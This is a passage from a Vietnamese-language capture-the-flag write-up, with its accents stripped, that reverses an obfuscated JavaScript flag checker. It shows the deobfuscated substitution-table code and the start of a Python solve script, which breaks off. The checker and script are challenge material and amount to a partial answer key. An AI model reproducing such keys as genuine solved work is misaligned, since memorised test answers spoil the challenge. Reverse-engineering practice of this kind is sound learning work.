style="color:#ae81ff">0x3d</span>,<span style="color:#ae81ff">0x64</span>,<span style="color:#ae81ff">0x5d</span>,<span style="color:#ae81ff">0x19</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0x4f</span>,<span style="color:#ae81ff">0xdc</span>,<span style="color:#ae81ff">0x22</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x46</span>,<span style="color:#ae81ff">0xee</span>,<span style="color:#ae81ff">0xb8</span>,<span style="color:#ae81ff">0x14</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0xb</span>,<span style="color:#ae81ff">0xdb</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0x32</span>,<span style="color:#ae81ff">0x3a</span>,<span style="color:#ae81ff">0xa</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x6</span>,<span style="color:#ae81ff">0x24</span>,<span style="color:#ae81ff">0x5c</span>,<span style="color:#ae81ff">0xc2</span>,<span style="color:#ae81ff">0xd3</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x62</span>,<span style="color:#ae81ff">0x91</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0x79</span>,<span style="color:#ae81ff">0xe7</span>,<span style="color:#ae81ff">0xc8</span>,<span style="color:#ae81ff">0x37</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x8d</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x4e</span>,<span style="color:#ae81ff">0xa9</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x56</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0xea</span>,<span style="color:#ae81ff">0x65</span>,<span style="color:#ae81ff">0x7a</span>,<span style="color:#ae81ff">0xae</span>,<span style="color:#ae81ff">0x8</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x25</span>,<span style="color:#ae81ff">0x2e</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0xb4</span>,<span style="color:#ae81ff">0xc6</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x1f</span>,<span style="color:#ae81ff">0x4b</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x8a</span>,<span style="color:#ae81ff">0x70</span>,<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0xb5</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x3</span>,<span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0xe</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x35</span>,<span style="color:#ae81ff">0x57</span>,<span style="color:#ae81ff">0xb9</span>,<span style="color:#ae81ff">0x86</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x1d</span>,<span style="color:#ae81ff">0x9e</span>,<span style="color:#ae81ff">0xe1</span>,<span style="color:#ae81ff">0xf8</span>,<span style="color:#ae81ff">0x98</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0xd9</span>,<span style="color:#ae81ff">0x8e</span>,<span style="color:#ae81ff">0x94</span>,<span style="color:#ae81ff">0x9b</span>,<span style="color:#ae81ff">0x1e</span>,<span style="color:#ae81ff">0x87</span>,<span style="color:#ae81ff">0xe9</span>,<span style="color:#ae81ff">0xce</span>,<span style="color:#ae81ff">0x55</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x8c</span>,<span style="color:#ae81ff">0xa1</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xd</span>,<span style="color:#ae81ff">0xbf</span>,<span style="color:#ae81ff">0xe6</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x68</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x99</span>,<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">0xf</span>,<span style="color:#ae81ff">0xb0</span>,<span style="color:#ae81ff">0x54</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x16</span>];<span style="color:#66d9ef">if</span>(_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8b</span>)]<span style="color:#f92672">!=</span><span style="color:#ae81ff">0x2c</span>)<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>Incorrect<span style="color:#960050;background-color:#1e0010">\</span>x20length<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">&#39;</span>);var _0x2884dc<span style="color:#f92672">=</span>[];<span style="color:#66d9ef">for</span>(let _0x1a57d6<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x1a57d6<span style="color:#f92672">&lt;</span>_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8b</span>)];_0x1a57d6<span style="color:#f92672">++</span>){_0x2884dc[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x91</span>)](_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x85</span>)](_0x1a57d6));}<span style="color:#66d9ef">for</span>(let _0xfc20f8<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0xfc20f8<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x10</span>;_0xfc20f8<span style="color:#f92672">++</span>){<span style="color:#66d9ef">for</span>(let _0x4fadbc<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0</span>;_0x4fadbc<span style="color:#f92672">&lt;</span>_0x3b37a2[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8b</span>)];_0x4fadbc<span style="color:#f92672">++</span>){_0x2884dc[_0x4fadbc]<span style="color:#f92672">=</span>_0x41bc91[_0x2884dc[_0x4fadbc]];}}var _0x45d93e<span style="color:#f92672">=</span><span style="color:#a6e22e">byteArrayToBase64</span>(_0x2884dc);console[<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x86</span>)](_0x45d93e);<span style="color:#66d9ef">if</span>(_0x45d93e<span style="color:#f92672">!=</span><span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x88</span>))<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x93</span>));<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">_0x452468</span>(<span style="color:#ae81ff">0x8c</span>));}function <span style="color:#a6e22e">_0x16be</span>(){<span style="color:#66d9ef">const</span> _0x4eae3d<span style="color:#f92672">=</span>[<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">1923945</span>aMREui<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">403288</span>ARWAZc<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">522465</span>dRWOJo<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">117</span>AUdDXf<span style="color:#e6db74">&#39;,&#39;</span>push<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">1266878</span>gdaSSP<span style="color:#e6db74">&#39;,&#39;</span>Incorrect<span style="color:#960050;background-color:#1e0010">\</span>x20flag<span style="color:#f92672">!</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">4091610</span>cgcMNe<span style="color:#e6db74">&#39;,&#39;</span>fromCharCode<span style="color:#e6db74">&#39;,&#39;</span>random<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">9597917</span>yhcHtu<span style="color:#e6db74">&#39;,&#39;</span>charCodeAt<span style="color:#e6db74">&#39;,&#39;</span>log<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">12</span>qPopiU<span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">/</span><span style="color:#ae81ff">52</span>NXNAD7Lui<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>G7idT7Dbue0L7vkV<span style="color:#f92672">/</span>bDey779tzuwf7c5G7c5HbDZHswUs<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#ae81ff">138664</span>SkZbmA<span style="color:#e6db74">&#39;,&#39;</span>floor<span style="color:#e6db74">&#39;,&#39;</span>length<span style="color:#e6db74">&#39;,&#39;</span>Good<span style="color:#960050;background-color:#1e0010">\</span>x20job,<span style="color:#960050;background-color:#1e0010">\</span>x20you<span style="color:#960050;background-color:#1e0010">\</span>x27re<span style="color:#960050;background-color:#1e0010">\</span>x20welcome<span style="color:#f92672">!!</span><span style="color:#960050;background-color:#1e0010">&#39;</span>];_0x16be<span style="color:#f92672">=</span><span style="color:#a6e22e">function</span>(){<span style="color:#66d9ef">return</span> _0x4eae3d;};<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x16be</span>();}
</span></span></code></pre></div><p>-&gt; JavaScript Obfuscate</p>
<p>Vy, mnh tin hnh th on code trn vo tool <a href="https://deobfuscate.relative.im/">deobfuscate</a> ny  deobfuscate on code trn.</p>
<p>Mnh nhn c output nh sau:</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/pupu.js">pupu.js</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getRandomInt</span>(<span style="color:#a6e22e">min</span>, <span style="color:#a6e22e">max</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> Math.<span style="color:#a6e22e">floor</span>(Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> (<span style="color:#a6e22e">max</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">min</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">+</span> <span style="color:#a6e22e">min</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">byteArrayToBase64</span>(<span style="color:#a6e22e">data</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">+</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">data</span>[<span style="color:#a6e22e">i</span>])
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">value</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">base64</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">xorStrings</span>(<span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">key</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">$116</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">$y</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">$118</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$116</span> <span style="color:#f92672">^</span> <span style="color:#a6e22e">$y</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">output</span> <span style="color:#f92672">+</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#a6e22e">$118</span>)
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">output</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>(<span style="color:#a6e22e">result</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> window <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">118</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">114</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">49</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">9</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">209</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">170</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">159</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">143</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">236</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">34</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">6</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">213</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">166</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">217</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">230</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">22</span>,
</span></span><span style="display:flex;"><span>  ]
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">44</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Incorrect length!&#39;</span>)
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">key</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">key</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">key</span>))
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0xfc20f8</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">_0xfc20f8</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">16</span>; <span style="color:#a6e22e">_0xfc20f8</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">options</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> window[<span style="color:#a6e22e">options</span>[<span style="color:#a6e22e">i</span>]]
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">byteArrayToBase64</span>(<span style="color:#a6e22e">options</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">value</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">value</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Incorrect flag!&#39;</span>)
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Good job, you&#39;re welcome!!&#34;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mi th c v  r rng hn !
Ti y, mng chng ta phi nhp vo phi c ng 44 k t v sau  c chuyn vo hm <code>check()</code>.</p>
<p>Chng trnh thc hin 1 vng lp 16 ln, qua mi ln cp nht <code> inputString[j] = xorValues[inputString[j]</code>, mi vng nh vy thay i 44 k t ca <code>inputString</code></p>
<p>Sau khi kt thc, chuyn string ny v base64 v so snh vi chui  cho <code>/52NXNAD7Lui+5G7idT7Dbue0L7vkV/bDey779tzuwf7c5G7c5HbDZHswUs=</code></p>
<p>-&gt; Sau y l script mnh gii bi ny:</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/pupu-flag-checker/pupu.py">pupu.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">118</span>,
